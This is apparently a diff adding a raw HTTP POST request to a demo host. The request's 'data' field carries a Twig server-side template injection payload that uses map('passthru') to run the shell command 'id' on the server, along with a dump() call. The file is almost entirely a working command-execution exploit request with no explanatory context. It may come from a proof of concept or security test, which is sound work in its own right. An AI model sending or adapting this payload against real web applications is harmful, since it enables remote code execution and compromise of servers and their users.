@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Connection: close
+
+data={{ dump() }}{{ [\u0027id\u0027]|map(\u0027passthru\u0027) }}
